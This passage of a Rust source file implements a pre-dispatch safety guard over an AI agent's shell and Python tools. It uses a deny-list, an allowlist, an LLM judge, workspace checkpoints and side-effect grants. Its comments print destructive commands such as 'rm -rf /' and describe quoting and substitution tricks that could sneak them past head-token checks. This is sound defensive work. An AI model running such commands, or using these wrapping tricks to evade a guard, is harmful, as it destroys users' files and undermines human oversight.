//! Command guard: a pre-dispatch safety gate over the Lucidos Agent's bash and
//! python tools. See ADR 0002 for the decision it implements.
//!
//! Classification is two-tier, the hybrid of ADR 0002:
//!
//!  * [`static_classify`] is the deterministic, zero-cost pass. It settles the
//!    two ends, a catastrophic deny-list that hard-blocks and an
//!    obviously-safe allowlist that runs now, and hands the *ambiguous middle*
//!    to the judge.
//!  * The LLM *judge* classifies that middle, erring toward ask. When the judge
//!    is off or unavailable, [`fallback_classify`] degrades to the static
//!    lists: the dangerous side-effect shapes plus a destruction scan, where an
//!    out-of-workspace target asks and an in-workspace one checkpoints.
//!
//! `IrreversibleDanger` on a chat channel pauses to ask the user, mirroring the
//! coding-agent permission model. `ReversibleDanger` snapshots the workspace on
//! a safety ref and runs, leaving a one-click Undo.
//!
//! The whole gate is off unless the workspace turns on the `command_guard`
//! preference, so it ships dark. The judge has its own sub-toggle.

use crate::llm::tool_names as tn;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::borrow::Cow;
use std::sync::LazyLock;

/// How dangerous a single bash/python command is, and therefore how the command
/// guard treats it. The static [`static_classify`] fast-path only ever settles
/// [`RiskLane::Safe`] and [`RiskLane::Catastrophic`]; the LLM *judge* (Phase 3)
/// classifies the ambiguous middle into [`RiskLane::Safe`],
/// [`RiskLane::ReversibleDanger`], or [`RiskLane::IrreversibleDanger`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RiskLane {
    /// Run immediately, no gate. The default for everything not flagged below.
    Safe,
    /// A pattern no legitimate workflow needs: recursive deletion of the
    /// filesystem root or home directory, a fork bomb, formatting a filesystem,
    /// or overwriting a raw block device. Hard-blocked, and the reason is fed
    /// back to the LLM as a failed tool result.
    Catastrophic,
    /// Destruction confined to the workspace, and so recoverable from version
    /// control. Produced by the judge or by the static fallback's destruction
    /// scan. Handled by snapshotting the workspace on a safety ref before
    /// running, which leaves a one-click Undo.
    ReversibleDanger,
    /// A command that may cause an irreversible real-world side-effect, or
    /// destruction outside the workspace. On a chat channel the guard pauses
    /// and asks the user, mirroring the coding agent.
    IrreversibleDanger,
}

/// The kind of irreversible real-world side-effect a command may perform. Only
/// meaningful for [`RiskLane::IrreversibleDanger`]. The judge tags each
/// irreversible command with a category, and the static fallback derives one
/// for the shapes it recognises. An unattended *trigger* runs the command only
/// when its declared **side-effect grant** contains that category (ADR 0002).
/// A chat turn always asks the user, whatever the category.
///
/// Wire form is snake_case. It rides on the trigger payload's
/// `side_effect_grant` array and in the judge's JSON `category` field.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SideEffectCategory {
    /// Sending email or messages — `mail`/`mailx`/`sendmail`, `osascript`
    /// driving Mail/Messages, Python `smtplib`.
    Email,
    /// A mutating outbound HTTP request — `curl`/`wget` POST/PUT/DELETE/PATCH or
    /// a data upload, Python `requests`/`httpx`/`session` writes.
    ExternalApi,
    /// A cloud-service mutation via the `gh`, `aws`, or `gcloud` CLIs.
    CloudCli,
    /// Deleting or overwriting files OUTSIDE the workspace — irreversible (no
    /// checkpoint is possible). Tagged by the judge, or by the static
    /// fallback's destruction scan when the judge is off (see
    /// [`fallback_classify`]).
    OutOfWorkspaceDestruction,
    /// An irreversible side-effect that doesn't fit the named categories — the
    /// judge's catch-all, and the fallback when the judge can't categorise. A
    /// trigger must grant `other` to run such a command.
    Other,
}

impl SideEffectCategory {
    /// Noun phrase for LLM-facing refusal / card text — reads as "may perform
    /// {reason}".
    pub fn reason(&self) -> &'static str {
        match self {
            Self::Email => {
                "an email or messaging side-effect (mail, sendmail, or AppleScript driving Mail/Messages)"
            }
            Self::ExternalApi => {
                "a mutating HTTP request (POST/PUT/DELETE/PATCH or a data upload)"
            }
            Self::CloudCli => "a cloud-service mutation via gh, aws, or gcloud",
            Self::OutOfWorkspaceDestruction => "destruction of files outside the workspace",
            Self::Other => "an irreversible real-world side-effect",
        }
    }

    /// Short user-facing label for the trigger side-effect-grant UI. Kept in
    /// sync with the frontend `SIDE_EFFECT_CATEGORIES` list (a `/harden` check
    /// would flag drift between the wire values and the UI).
    pub fn label(&self) -> &'static str {
        match self {
            Self::Email => "Send email or messages",
            Self::ExternalApi => "Call external APIs (mutating HTTP)",
            Self::CloudCli => "Cloud CLI mutations (gh / aws / gcloud)",
            Self::OutOfWorkspaceDestruction => "Destroy files outside the workspace",
            Self::Other => "Other irreversible side-effects",
        }
    }
}

/// The outcome of the static (zero-cost, deterministic) classification pass.
/// Either the lane is settled outright, or the command is the *ambiguous
/// middle* and is handed to the LLM judge.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum StaticVerdict {
    /// Settled by static rules — use this lane, never consult the judge.
    Settled(RiskLane),
    /// The static fast-path can't confidently settle this command; the judge
    /// (or, when the judge is off/unavailable, the static fallback) decides.
    NeedsJudge(JudgeInput),
}

/// Everything the judge (or the static fallback) needs to classify one
/// ambiguous command: the tool it came from, the command text itself, and the
/// out-of-workspace risk signal computed by the static pass.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct JudgeInput {
    pub tool_name: String,
    pub command: String,
    /// True when the static pass saw a filesystem target escaping the
    /// workspace. A *risk signal* the judge weighs, not a verdict on its own,
    /// because out-of-workspace destruction is irreversible.
    pub out_of_workspace: bool,
    /// True when the Safe fast path actively REFUSED this command rather than
    /// merely not recognising its head: substitution, a code-injecting
    /// preamble, a path-qualified head, an out-of-workspace write, an
    /// executable git config.
    ///
    /// The chat lane ignores it, because both outcomes route to the judge
    /// there. The UNATTENDED coding-agent lane reads it: with nobody to answer
    /// a card, a shape the guard refused to see through is denied, while an
    /// unrecognised head (`cargo build`) still runs.
    pub fast_path_refused: bool,
}

impl JudgeInput {
    /// Stable per-turn cache key — same tool + same command text re-judges to
    /// the same verdict, so the agentic loop caches by this string.
    pub fn cache_key(&self) -> String {
        format!("{}\u{0}{}", self.tool_name, self.command)
    }
}

/// A resolved classification ready to act on: the final lane plus, when the
/// judge produced one, its tailored one-line summary for the permission card
/// (`None` falls back to the static [`permission_summary`]).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct JudgedClassification {
    pub lane: RiskLane,
    pub summary: Option<String>,
    /// The side-effect category — set only when `lane == IrreversibleDanger`
    /// (the judge tags it; the static fallback derives it for known shapes,
    /// defaulting to [`SideEffectCategory::Other`]). Drives the trigger
    /// side-effect-grant check; `None` for every non-irreversible lane.
    pub category: Option<SideEffectCategory>,
}

/// Shells whose `-c` payload [`unwrap_shell_command`] descends into.
///
/// Deliberately a SUBSET of `core::WRAPPER_SHELLS`, which the step-row labeller
/// uses for the same shapes; that constant carries the reasoning. Read it before
/// adding a shell here: the tail-discard in `tail_runs_more_commands` is only
/// sound for a shell whose operands after the script set `$0`, and a label has no
/// such requirement.
pub(crate) const GUARD_SHELLS: [&str; 6] = ["sh", "bash", "zsh", "dash", "ksh", "ash"];

/// Unwrap a single shell `-c`-style wrapper so the inner script is what gets
/// classified.
///
/// Both classifiers inspect each segment's HEAD token and do NOT descend into
/// a shell payload. A wrapped command would read as head `bash` and bypass
/// every check. Codex sends commands pre-wrapped, and a chat `run_bash` can be
/// handed the same shape. Returns the original command when it is not a
/// recognized shell wrapper.
pub(crate) fn unwrap_shell_command(command: &str) -> Cow<'_, str> {
    const SHELLS: &[&str] = &GUARD_SHELLS;
    let trimmed = command.trim_start();
    let Some(first) = trimmed.split_whitespace().next() else {
        return Cow::Borrowed(command);
    };
    // Normalized, not a raw basename. An escaped or quoted head runs the same
    // shell, and leaving it unwrapped hides the payload from every scan that
    // follows. Unwrapping can only ever expose more.
    let base = normalized_head(first);
    if !SHELLS.contains(&base) {
        return Cow::Borrowed(command);
    }
    // Walk whitespace-delimited tokens (with byte offsets) to find the `-c`-style
    // flag; everything after it is the script. One quote layer is stripped so the
    // common `zsh -lc 'curl ...'` form classifies as a clean `curl ...`.
    let bytes = trimmed.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        while i < bytes.len() && bytes[i].is_ascii_whitespace() {
            i += 1;
        }
        let start = i;
        while i < bytes.len() && !bytes[i].is_ascii_whitespace() {
            i += 1;
        }
        if start == i {
            break;
        }
        if is_shell_c_flag(&trimmed[start..i]) {
            let (script, tail) = split_shell_script_operand(trimmed[i..].trim());
            // `sh -c <script> [$0 args]` makes the tail positional
            // parameters, which is why cutting at the close quote is right. The
            // tail is only OURS to discard when it really is plain words. A
            // control operator there belongs to the OUTER shell and runs, so
            // returning the script alone would hide it from every scan. Fall
            // back to the whole command, which the segment split covers end to
            // end. Strictly more scanning, never less.
            if tail_runs_more_commands(tail) {
                return Cow::Borrowed(command);
            }
            return script;
        }
    }
    Cow::Borrowed(command)
}

/// A single-dash cluster of shell option letters that includes `c`: `-c`, `-lc`,
/// `-ic`, `-lic`, etc. Rejects long options and non-shell flags (`-config`,
/// `-l`).
fn is_shell_c_flag(tok: &str) -> bool {
    match tok.strip_prefix('-') {
        // Any single-dash cluster of ASCII letters containing `c`. An
        // enumerated letter set is the wrong shape: it has to list every option
        // a shell accepts, and each one it misses is a real invocation whose
        // payload then goes unclassified. Rejecting long options and
        // non-letter clusters is all that is needed. Reading MORE things as a
        // wrapper only ever exposes the script to the scans.
        Some(letters) if tok.len() >= 2 && !tok.starts_with("--") => {
            letters.contains('c') && letters.chars().all(|ch| ch.is_ascii_alphabetic())
        }
        _ => false,
    }
}

/// Take the script operand that follows a shell `-c` flag, as POSIX builds it.
///
/// In `sh -c <script> [$0 [arg ...]]` the script is ONE word, and anything
/// after it sets `$0` and the positional parameters. A word is built by
/// JOINING adjacent quoted and unquoted runs, so the first close quote is not
/// where the word ends. `'rm -rf '\''/'\'''` is one word reading `rm -rf '/'`,
/// and cutting at that first close quote handed every scan the truncated
/// prefix `rm -rf ` instead. That idiom is exactly what Codex emits.
///
/// One quoting layer is decoded, which is what the inner shell sees: `-c`
/// makes it re-parse the operand, so a quote the outer shell escaped arrives
/// as a literal quote the inner shell then acts on.
///
/// An operand that does not START with a quote is returned whole, tail
/// included. Cutting it at the first space would be POSIX-exact and would scan
/// LESS, and every classifier downstream is conservative by design.
///
/// Returns the script and the TAIL after it, because the caller has to decide
/// whether that tail is discardable (see [`tail_runs_more_commands`]).
fn split_shell_script_operand(s: &str) -> (Cow<'_, str>, &str) {
    let b = s.as_bytes();
    let opens_quoted = !b.is_empty() && (b[0] == b'\'' || b[0] == b'"' || opens_ansi_c_run(b, 0));
    if !opens_quoted {
        return (Cow::Borrowed(s), "");
    }
    let mut word = String::new();
    let mut i = 0;
    while i < b.len() {
        match b[i] {
            // A single-quoted run is literal end to end, escapes included.
            b'\'' => {
                let start = i + 1;
                let end = s[start..].find('\'').map_or(s.len(), |o| start + o);
                word.push_str(&s[start..end]);
                i = (end + 1).min(s.len());
            }
            // A double-quoted run keeps its content, and a backslash there
            // escapes only these four characters.
            b'"' => {
                i += 1;
                while i < b.len() && b[i] != b'"' {
                    if b[i] == b'\\' && matches!(b.get(i + 1), Some(b'"' | b'\\' | b'$' | b'`')) {
                        word.push(b[i + 1] as char);
                        i += 2;
                        continue;
                    }
                    i += push_char_at(&mut word, s, i);
                }
                i = (i + 1).min(s.len());
            }
            // ANSI-C quoting. Bash decodes these escapes BEFORE the word
            // reaches `-c`, so copying them verbatim loses the separator they
            // stand for: `bash -c 'echo hi'$'\x3b'"rm -rf /"` runs the `rm`.
            _ if opens_ansi_c_run(b, i) => {
                i = push_ansi_c_run(&mut word, s, i + 1);
            }
            b'\\' => {
                i += 1;
                if i < b.len() {
                    i += push_char_at(&mut word, s, i);
                }
            }
            // A substitution glued to the word is part of the word in POSIX.
            // Modelling that is the segment scans' job, not this one. End the
            // word here so the opener lands in the TAIL, where
            // `tail_runs_more_commands` sees it and hands back the whole
            // command. Otherwise the `$` is pushed into the script and the
            // tail starts at `(`, which nothing recognises: the substitution
            // in `bash -c 'echo hi'$(rm -rf /)` disappeared entirely.
            _ if opens_substitution(b, i) => break,
            c if ends_shell_word(c) => break,
            _ => i += push_char_at(&mut word, s, i),
        }
    }
    (Cow::Owned(word), &s[i..])
}

/// True when a substitution opener starts at byte `i`: `$(`, `<(`, `>(`, or a
/// backtick. Quoting is the CALLER's business, since the callers disagree
/// about which quoting suppresses it.
fn opens_substitution(b: &[u8], i: usize) -> bool {
    b[i] == b'`' || (matches!(b[i], b'$' | b'<' | b'>') && b.get(i + 1) == Some(&b'('))
}

/// True when an ANSI-C `$'…'` run opens at byte `i`.
fn opens_ansi_c_run(b: &[u8], i: usize) -> bool {
    b[i] == b'$' && b.get(i + 1) == Some(&b'\'')
}

/// Append the decoded body of an ANSI-C `$'…'` run whose opening quote is at
/// `open`, and return the index just past its closing quote. An unterminated
/// run is read to the end of input.
fn push_ansi_c_run(word: &mut String, s: &str, open: usize) -> usize {
    let b = s.as_bytes();
    let mut i = open + 1;
    while i < b.len() {
        match b[i] {
            b'\'' => return i + 1,
            b'\\' if i + 1 < b.len() => {
                let (text, next) = decode_ansi_c_escape(s, i + 1);
                word.push_str(&text);
                i = next;
            }
            _ => i += push_char_at(word, s, i),
        }
    }
    i
}

/// Decode one ANSI-C escape whose body starts at `at`, just past the
/// backslash. Returns the text it stands for and the index after it. An
/// unrecognised escape keeps its backslash, which is what bash does.
fn decode_ansi_c_escape(s: &str, at: usize) -> (String, usize) {
    let one = |c: char| (c.to_string(), at + 1);
    match s.as_bytes()[at] {
        b'a' => one('\u{7}'),
        b'b' => one('\u{8}'),
        b'e' | b'E' => one('\u{1b}'),
        b'f' => one('\u{c}'),
        b'n' => one('\n'),
        b'r' => one('\r'),
        b't' => one('\t'),
        b'v' => one('\u{b}'),
        b'\\' => one('\\'),
        b'\'' => one('\''),
        b'"' => one('"'),
        b'?' => one('?'),
        b'x' => radix_escape(s, at + 1, 16, 2, "x"),
        b'u' => radix_escape(s, at + 1, 16, 4, "u"),
        b'U' => radix_escape(s, at + 1, 16, 8, "U"),
        b'0'..=b'7' => radix_escape(s, at, 8, 3, ""),
        _ => {
            let mut text = String::from('\\');
            let len = push_char_at(&mut text, s, at);
            (text, at + len)
        }
    }
}

/// Decode up to `max` digits of `radix` starting at `at`, the shape behind
/// `\xHH`, `\uHHHH` and `\nnn`. With no digit at all the escape is literal
/// text, so the backslash and `prefix` are returned unchanged.
fn radix_escape(s: &str, at: usize, radix: u32, max: usize, prefix: &str) -> (String, usize) {
    let b = s.as_bytes();
    let end = (at + max).min(b.len());
    let digits = (at..end)
        .take_while(|&i| (b[i] as char).is_digit(radix))
        .count();
    if digits == 0 {
        return (format!("\\{prefix}"), at);
    }
    let value = u32::from_str_radix(&s[at..at + digits], radix).unwrap_or(0);
    let ch = char::from_u32(value).unwrap_or(char::REPLACEMENT_CHARACTER);
    (ch.to_string(), at + digits)
}

/// Push the whole character starting at byte `at` onto `word` and return its
/// byte length, so the caller's index stays on a char boundary.
fn push_char_at(word: &mut String, s: &str, at: usize) -> usize {
    match s[at..].chars().next() {
        Some(ch) => {
            word.push(ch);
            ch.len_utf8()
        }
        None => 1,
    }
}

/// True for a byte that ends an UNQUOTED shell word: whitespace, or a control
/// operator.
///
/// The operator half is load-bearing. A `;` right after a quoted run belongs
/// to the OUTER shell. Gluing it onto the script would hide the command after
/// it from [`tail_runs_more_commands`].
fn ends_shell_word(c: u8) -> bool {
    c.is_ascii_whitespace() || matches!(c, b';' | b'|' | b'&' | b'<' | b'>' | b'(' | b')')
}

/// True when the tail after a `-c` script operand can run something rather than
/// just supplying `$0` and positional parameters.
///
/// The separator set mirrors [`command_segments`] exactly, plus the
/// substitution forms from [`has_command_substitution`]: those are precisely the
/// constructs that would have become their own segment had the command not been
/// truncated.
///
/// **Redirection counts too**, even though it starts no new segment. It
/// belongs to the OUTER shell, so it writes a file the unwrapped script never
/// mentions. The unwrap result replaces the raw command for every later check,
/// so an unnoticed redirect is invisible even to `command_escapes_workspace`.
fn tail_runs_more_commands(tail: &str) -> bool {
    tail.contains(';')
        || tail.contains('|')
        || tail.contains('&')
        || tail.contains('\n')
        || tail.contains('>')
        || tail.contains('<')
        || has_command_substitution(tail)
}

/// The static, deterministic, zero-cost classification pass.
///
/// Only the four bash/python command-running tools are inspected; every other
/// tool is `Settled(Safe)` (the guard never gates reads, edits, HTTP, etc.).
/// Settles the two ends of the spectrum and hands the middle to the judge:
///   * catastrophic deny-list → `Settled(Catastrophic)` (hard-block),
///   * obviously read-only / in-workspace-write shapes → `Settled(Safe)`,
///   * everything else → `NeedsJudge` (the judge classifies it, or the static
///     fallback does when the judge is off — see [`fallback_classify`]).
///
/// Catastrophic wins over everything (checked first), so a command that is both
/// catastrophic and side-effect-shaped is hard-blocked rather than judged.
pub fn static_classify(tool_name: &str, input: &Value) -> StaticVerdict {
    let Some(raw) = command_text(tool_name, input) else {
        return StaticVerdict::Settled(RiskLane::Safe);
    };
    // Classify the INNER script of a shell wrapper. Every check below reads
    // each segment's head token and does not descend into the payload. Without
    // this, a wrapped command reads as head `bash`, skips the catastrophic
    // hard-block, and with the judge off falls through to Safe.
    let unwrapped = unwrap_shell_command(raw);
    let cmd = unwrapped.as_ref();
    if catastrophic_reason(cmd).is_some() {
        return StaticVerdict::Settled(RiskLane::Catastrophic);
    }
    let is_bash = matches!(tool_name, tn::RUN_BASH | tn::RUN_BASH_BACKGROUND);
    // Python declines are all ACTIVE signals (subprocess, eval, a network
    // write, a destruction call), never an unlisted-head omission, so the
    // whole set is a refusal.
    let declined = if is_bash {
        bash_fast_path(cmd)
    } else {
        (!python_is_statically_safe(cmd)).then_some(FastPathDecline::Refusal)
    };
    let Some(declined) = declined else {
        return StaticVerdict::Settled(RiskLane::Safe);
    };
    StaticVerdict::NeedsJudge(JudgeInput {
        tool_name: tool_name.to_string(),
        command: cmd.to_string(),
        // The out-of-workspace marker is a bash-only path heuristic; Python code
        // is handed to the judge verbatim, which reads any paths from the code.
        out_of_workspace: is_bash && command_escapes_workspace(cmd),
        fast_path_refused: declined == FastPathDecline::Refusal,
    })
}

/// The classification for an ambiguous command when the judge is off or
/// unavailable. Static, deterministic coverage in priority order:
///
///   1. an obvious side-effect shape ([`static_side_effect_category`]) →
///      `IrreversibleDanger` with that category (ask on chat, grant-check on a
///      trigger),
///   2. a destruction shape with an out-of-workspace target →
///      `IrreversibleDanger` + [`SideEffectCategory::OutOfWorkspaceDestruction`]
///      (no checkpoint can cover it),
///   3. a destruction shape confined to the workspace → `ReversibleDanger`
///      (checkpoint + run — no prompt),
///   4. everything else → `Safe` (the Phase-2 default: run it).
///
/// Coarser than the judge by construction. Destruction behind a variable path,
/// and the in-place editing flags, are residuals only the judge catches. What
/// this does cover is the headline shapes: a delete, move, copy or truncating
/// redirect onto a path outside the workspace.
pub fn fallback_classify(ji: &JudgeInput) -> JudgedClassification {
    if let Some(cat) = static_side_effect_category(&ji.command) {
        return JudgedClassification {
            lane: RiskLane::IrreversibleDanger,
            summary: Some(format!("May perform {}.", cat.reason())),
            category: Some(cat),
        };
    }
    let is_bash = matches!(
        ji.tool_name.as_str(),
        tn::RUN_BASH | tn::RUN_BASH_BACKGROUND
    );
    let scope = if is_bash {
        bash_destruction_scope(&ji.command)
    } else {
        python_destruction_scope(&ji.command)
    };
    match scope {
        Some(DestructionScope::OutOfWorkspace) => JudgedClassification {
            lane: RiskLane::IrreversibleDanger,
            summary: Some(format!(
                "May perform {}.",
                SideEffectCategory::OutOfWorkspaceDestruction.reason()
            )),
            category: Some(SideEffectCategory::OutOfWorkspaceDestruction),
        },
        Some(DestructionScope::InWorkspace) => JudgedClassification {
            lane: RiskLane::ReversibleDanger,
            summary: None,
            category: None,
        },
        None => JudgedClassification {
            lane: RiskLane::Safe,
            summary: None,
            category: None,
        },
    }
}

// --- Static destruction scan (fallback coverage for the judge-off path) -----

/// Where a statically-detected destruction lands.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DestructionScope {
    /// Confined to the workspace — recoverable via checkpoint.
    InWorkspace,
    /// Touches a target outside the workspace — no checkpoint can cover it.
    OutOfWorkspace,
}

/// Heads that destroy or overwrite every path argument they're given.
static DESTRUCTIVE_HEADS: &[&str] = &["rm", "rmdir", "unlink", "shred", "truncate"];
/// Heads whose LAST argument is overwritten — the preceding args are read-only
/// sources, and out-of-workspace reads are a wanted feature.
static DESTRUCTIVE_DEST_HEADS: &[&str] = &["mv", "cp"];

/// The destruction scope of a whole command line: out-of-workspace wins over
/// in-workspace (one un-checkpointable segment poisons the line), `None` when
/// no segment has a destruction shape.
fn bash_destruction_scope(command: &str) -> Option<DestructionScope> {
    bash_destruction_scope_at(command, 0)
}

/// [`bash_destruction_scope`], carrying the substitution-recursion depth. A
/// substitution body is scanned like a segment, for the reason
/// [`substitution_bodies`] gives: without it `ls $(rm -rf ~)` resolves to head
/// `ls`, finds no destruction, and the fallback settles it Safe.
fn bash_destruction_scope_at(command: &str, depth: usize) -> Option<DestructionScope> {
    /// True when `scope` escapes the workspace; records an in-workspace hit.
    fn escapes(scope: Option<DestructionScope>, found_in_ws: &mut bool) -> bool {
        match scope {
            Some(DestructionScope::OutOfWorkspace) => true,
            Some(DestructionScope::InWorkspace) => {
                *found_in_ws = true;
                false
            }
            None => false,
        }
    }
    let mut found_in_ws = false;
    for segment in command_segments(command) {
        if escapes(segment_destruction_scope(&segment), &mut found_in_ws) {
            return Some(DestructionScope::OutOfWorkspace);
        }
    }
    if depth < MAX_SUBSTITUTION_DEPTH {
        for body in substitution_bodies(command) {
            let scope = bash_destruction_scope_at(body, depth + 1);
            if escapes(scope, &mut found_in_ws) {
                return Some(DestructionScope::OutOfWorkspace);
            }
        }
    }
    found_in_ws.then_some(DestructionScope::InWorkspace)
}

/// Destruction scope of one shell segment, or `None`. Skips the same benign
/// prefixes the other scans do, so `sudo rm -rf /etc/x` is seen.
fn segment_destruction_scope(segment: &str) -> Option<DestructionScope> {
    // A truncating redirect (`>`, not `>>`) onto a path outside the workspace
    // overwrites it — destruction no checkpoint covers. Append (`>>`) is an
    // out-of-workspace EDIT (wanted), and in-workspace overwrite redirects are
    // settled Safe upstream, so neither lands here.
    if truncating_redirect_escapes(segment) {
        return Some(DestructionScope::OutOfWorkspace);
    }
    let toks: Vec<&str> = segment.split_whitespace().collect();
    // Out-of-workspace wins over in-workspace across the candidate readings of
    // the preamble, the same way it wins across segments.
    danger_head_candidates(&toks)
        .into_iter()
        .filter_map(|(base, head_args)| head_destruction_scope(&base, head_args))
        .max_by_key(|scope| match scope {
            DestructionScope::InWorkspace => 0,
            DestructionScope::OutOfWorkspace => 1,
        })
}

/// Destruction scope implied by one resolved command word plus its arguments.
fn head_destruction_scope(base: &str, head_args: &[&str]) -> Option<DestructionScope> {
    if base == "dd" {
        // dd overwrites its `of=` target (a block-device target is already
        // caught by the catastrophic scan upstream). No `of=` → stdout → not
        // destruction.
        let of_target = head_args.iter().find_map(|a| a.strip_prefix("of="));
        return of_target.map(|t| {
            if !path_in_workspace(t) && !is_harmless_redirect(t) {
                DestructionScope::OutOfWorkspace
            } else {
                DestructionScope::InWorkspace
            }
        });
    }
    let args: Vec<&str> = head_args
        .iter()
        .copied()
        .filter(|a| !a.starts_with('-'))
        .collect();
    if DESTRUCTIVE_HEADS.contains(&base) {
        return Some(if args.iter().any(|a| token_escapes_workspace(a)) {
            DestructionScope::OutOfWorkspace
        } else {
            DestructionScope::InWorkspace
        });
    }
    if DESTRUCTIVE_DEST_HEADS.contains(&base) && args.len() >= 2 {
        return Some(if args.last().is_some_and(|a| token_escapes_workspace(a)) {
            DestructionScope::OutOfWorkspace
        } else {
            DestructionScope::InWorkspace
        });
    }
    None
}

/// True when the segment has a TRUNCATING output redirect (`>`, not `>>`)
/// whose target is a path outside the workspace.
fn truncating_redirect_escapes(segment: &str) -> bool {
    REDIRECT_RE.captures_iter(segment).any(|c| {
        let whole = c.get(0).map(|m| m.as_str()).unwrap_or("");
        let target = c.get(1).map(|m| m.as_str()).unwrap_or("");
        !whole.contains(">>") && !path_in_workspace(target) && !is_harmless_redirect(target)
    })
}

/// The destruction sub-set of the Python side-effect signals — calls that
/// delete, move, or truncate files. Split out of the judge-routing signal list
/// so the fallback can derive a lane from them.
static PY_DESTRUCTION_CALLS: &[&str] = &[
    "os.remove(",
    "os.unlink(",
    "os.rmdir(",
    "os.removedirs(",
    "os.rename(",
    "os.replace(",
    "os.truncate(",
    "shutil.rmtree(",
    "shutil.move(",
    ".unlink(",
    ".rmdir(",
];

/// Destruction scope of Python `code`, or `None`. A destruction call paired
/// with any string literal that looks like an escaping path is
/// out-of-workspace. With only relative literals it is in-workspace, and so
/// checkpointable. Coarse on purpose: the literal need not be the destruction
/// call's own argument. A stray absolute path alongside an unrelated delete
/// errs toward ask, the fallback's documented direction. A
/// destruction call on a pure variable path stays in-workspace (the checkpoint
/// covers the common case; the judge covers the rest when it's on).
fn python_destruction_scope(code: &str) -> Option<DestructionScope> {
    if !PY_DESTRUCTION_CALLS.iter().any(|s| code.contains(s)) {
        return None;
    }
    Some(if python_string_literal_escapes(code) {
        DestructionScope::OutOfWorkspace
    } else {
        DestructionScope::InWorkspace
    })
}

/// True when any quoted string literal in `code` looks like a path escaping
/// the workspace.
fn python_string_literal_escapes(code: &str) -> bool {
    static LITERAL: LazyLock<regex::Regex> =
        LazyLock::new(|| regex::Regex::new(r#"'([^']*)'|"([^"]*)""#).unwrap());
    LITERAL.captures_iter(code).any(|c| {
        let s = c
            .get(1)
            .or_else(|| c.get(2))
            .map(|m| m.as_str())
            .unwrap_or("");
        s.starts_with('/') || s.starts_with('~') || s == ".." || s.contains("../")
    })
}

/// The STOP message handed back to the LLM when a catastrophic command is
/// refused. Re-derives the specific reason so the model learns exactly what
/// tripped the guard; falls back to a generic phrase if extraction fails.
pub fn catastrophic_refusal(tool_name: &str, input: &Value) -> String {
    let reason = command_text(tool_name, input)
        .and_then(catastrophic_reason)
        .unwrap_or("a catastrophic, irreversible operation");
    format!(
        "Refused by the command guard — this command was NOT run. It matches {reason}, which is \
         irreversible and no legitimate task needs it. Do not retry it; choose a different, safe \
         approach (for example, operate only on specific paths inside the workspace's data/ \
         directory)."
    )
}

/// A checkpoint whose **pre** image is on disk and whose command has not run
/// yet. Handed back to the agentic loop by the guard so the loop can close the
/// bracket once the command returns (`finalize_command_checkpoint`): only then
/// is it known what the command changed, and therefore whether a
/// `CommandCheckpointed` card is worth showing at all.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PendingCheckpoint {
    pub checkpoint_id: String,
    /// Already scrubbed by `core::redact_postgres_secrets`.
    pub command: String,
    pub summary: String,
}

/// The command guard's pre-dispatch decision for one bash/python tool call.
/// Produced by `LucidosEngine::command_guard_decision` (see
/// `engine::command_permission`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GuardDecision {
    /// Run the command normally.
    Proceed,
    /// Run the command, then close the checkpoint bracket (ADR 0002, Phase 4).
    /// Identical to `Proceed` on the dispatch side; the payload is what the
    /// loop hands back to `finalize_command_checkpoint` afterwards.
    ProceedCheckpointed(PendingCheckpoint),
    /// Block this command and hand `message` back to the LLM as a failed tool
    /// result, on a catastrophic hard-block or a chat Deny. The turn continues,
    /// so the model can route around it.
    Refuse(String),
    /// Block this command AND fail the whole trigger run (ADR 0002, Phase 5): an
    /// unattended trigger hit an `IrreversibleDanger` command whose side-effect
    /// category isn't in its grant. The agentic loop records the block as a
    /// failed tool result, emits a terminal `ResponseFailed`, and returns `Err`
    /// so the scheduler's failure-notification path surfaces it. Only ever
    /// produced on the `Trigger` channel.
    FailTrigger(String),
}

/// Extract the inspectable command text from a tool call: the `command` field
/// for the bash tools, the `code` field for the python tools. `None` for any
/// other tool (the guard does not inspect it).
pub fn command_text<'a>(tool_name: &str, input: &'a Value) -> Option<&'a str> {
    let field = match tool_name {
        tn::RUN_BASH | tn::RUN_BASH_BACKGROUND => "command",
        tn::RUN_PYTHON | tn::RUN_PYTHON_BACKGROUND => "code",
        _ => return None,
    };
    input.get(field).and_then(Value::as_str)
}

// ===========================================================================
// Static "obviously safe" fast-path.
//
// A POSITIVE allowlist of shapes that are safe regardless of the judge: reads,
// in-workspace writes, downloads and read-only git. The allowlist is fail-SAFE.
// Anything not on it falls through to the judge, so a missing entry costs
// latency, never safety. The breadth is a pure tuning knob: widening it moves
// more common commands off the judge without changing what is gated.
// Deliberately ABSENT is anything that can spawn or eval arbitrary code, which
// would let a dangerous payload ride in unclassified.
// ===========================================================================

/// Command heads that read or transform-to-stdout. Output redirects are
/// validated separately by [`segment_safety`].
///
/// Most are safe regardless of their arguments. A handful can be POINTED at an
/// output path instead of stdout, and those are listed again in
/// [`WRITE_CAPABLE_READ_ONLY_HEADS`] with an extra check. Before adding a head
/// here, read its man page for an output-file flag or a trailing positional.
/// List it there too if it has one.
static READ_ONLY_HEADS: &[&str] = &[
    // Listing / inspection (`find` is NOT here — `find -delete`/`-exec` mutate)
    "ls",
    "dir",
    "vdir",
    "tree",
    "stat",
    "file",
    "du",
    "df",
    "pwd",
    "realpath",
    "readlink",
    "basename",
    "dirname",
    // Reading / dumping file content
    "cat",
    "tac",
    "nl",
    "head",
    "tail",
    "wc",
    "less",
    "more",
    "strings",
    "od",
    "hexdump",
    "xxd",
    "look",
    // Text search / transform to stdout
    "grep",
    "egrep",
    "fgrep",
    "rg",
    "ag",
    "ack",
    "sort",
    "uniq",
    "cut",
    "tr",
    "fold",
    "fmt",
    "expand",
    "unexpand",
    "column",
    "comm",
    "join",
    "paste",
    "rev",
    "jq",
    "yq",
    "diff",
    "cmp",
    "base64",
    // Hashing
    "md5",
    "md5sum",
    "sha1sum",
    "sha256sum",
    "sha512sum",
    "shasum",
    "cksum",
    "b2sum",
    // System info (read-only)
    "echo",
    "printf",
    "printenv",
    "date",
